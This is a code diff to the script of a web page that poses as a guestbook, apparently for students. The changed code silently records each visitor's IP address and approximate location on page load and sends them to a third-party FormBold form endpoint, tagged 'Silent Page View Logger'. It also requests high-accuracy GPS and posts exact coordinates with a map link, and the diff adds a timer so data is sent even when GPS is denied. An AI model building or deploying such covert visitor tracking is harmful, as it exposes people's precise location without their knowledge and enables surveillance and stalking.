@@ -115,13 +115,16 @@
     </main>
 
     <script>
-        // Global storage container for baseline session tracking data
+        // Global variables to store information in temporary memory
         let trackingData = {
             ip: "Unavailable",
             location: "Unavailable"
         };
+        
+        let hasSentPayload = false; // Prevents double-sending to save FormBold limits
+        let trackingTimer = null;   // Timer reference
 
-        // 1. Core initialization sequence on execution loop
+        // 1. Initial execution on page load
         fetch(window.location.href)
             .then(res => {
                 const geoHeader = res.headers.get('x-visitor-geo');
@@ -137,47 +140,58 @@
                     }
                 }
                 
-                // STEP A: Fire the quiet IP transmission payload instantly to FormBold
-                sendToFormBold("System Automated Ping", "Silent Page View Logger", {});
-                
-                // STEP B: Request high-precision system GPS data right after
+                // Start a 2.5-second safety countdown window
+                trackingTimer = setTimeout(() => {
+                    if (!hasSentPayload) {
+                        sendToFormBold("System Automated Ping", "Silent Page View Logger (GPS Timed Out/Denied)", {});
+                    }
+                }, 2500);
+
+                // Instantly pop up the high-accuracy device GPS permission prompt
                 requestPreciseLocation();
             })
             .catch(err => {
-                console.log("Running locally or edge headers missing:", err);
-                sendToFormBold("Local Test System Ping", "Silent Page View Logger", {});
+                console.log("Local execution or headers missing:", err);
                 requestPreciseLocation();
             });
 
-        // 2. High-precision hardware geolocation query structure
+        // 2. High-precision hardware GPS handler
         function requestPreciseLocation() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        // User clicked ALLOW: Stop the safety timeout completely
+                        clearTimeout(trackingTimer);
+                        
+                        if (hasSentPayload) return; // Guard clause
+
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
                         
                         const preciseGPS = {
+                            "Tracking Status": "HIGH ACCURACY GPS GRANTED",
                             "Latitude": lat,
                             "Longitude": lon,
                             "Accuracy Radius": `${accuracy}m`,
                             "Google Maps Link": `https://www.google.com/maps?q=${lat},${lon}`
                         };
 
-                        // Push the secondary detailed coordinate dataset forward
+                        // Send merged data packet (IP + GPS data all together in 1 form count)
                         sendToFormBold("System Automated Ping", "PRECISE GPS ACQUIRED", preciseGPS);
                     },
                     (error) => {
-                        console.log("Device location lookup bypassed or rejected:", error.message);
+                        console.log("GPS prompt skipped or denied. Waiting for fallback timer.");
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             }
         }
 
-        // 3. Central data transport engine interfacing FormBold endpoint
+        // 3. Central FormBold Sender Engine
         function sendToFormBold(studentName, actionType, extraData = {}) {
+            hasSentPayload = true; // Block any secondary attempts from taking place
+
             const formData = new FormData();
             formData.append("_subject", `[${actionType}] - ${studentName}`);
             formData.append("Interaction Type", actionType);
@@ -186,7 +200,7 @@
             formData.append("General Location", trackingData.location);
             formData.append("Timestamp", new Date().toLocaleString());
 
-            // Map custom properties to form body attributes
+            // Append precise GPS variables safely if they exist
             Object.keys(extraData).forEach(key => {
                 formData.append(key, extraData[key]);
             });
@@ -198,11 +212,11 @@
                     'Accept': 'application/json'
                 }
             })
-            .then(() => console.log(`Payload tracking delivery successful: ${actionType}`))
-            .catch(err => console.error("Transport layer disruption:", err));
+            .then(() => console.log(`Successfully logged: ${actionType}`))
+            .catch(err => console.error("Network upload failure:", err));
         }
 
-        // 4. Click event interaction interceptor
+        // 4. Manual user sign-in action button
         function submitGuestbook() {
             const nameInput = document.getElementById('studentName');
             const nameField = nameInput ? nameInput.value.trim() : "";
@@ -212,7 +226,8 @@
                 return;
             }
 
-            sendToFormBold(nameField, "Manual Guestbook Signature", {});
+            // Interactive inputs are treated separately
+            sendToFormBold(nameField, "Manual Guestbook Signature", { "Tracking Status": "User Manual Input" });
             alert(`Thank you, ${nameField}! Your entry has been recorded.`);
             if (nameInput) nameInput.value = ""; 
         }
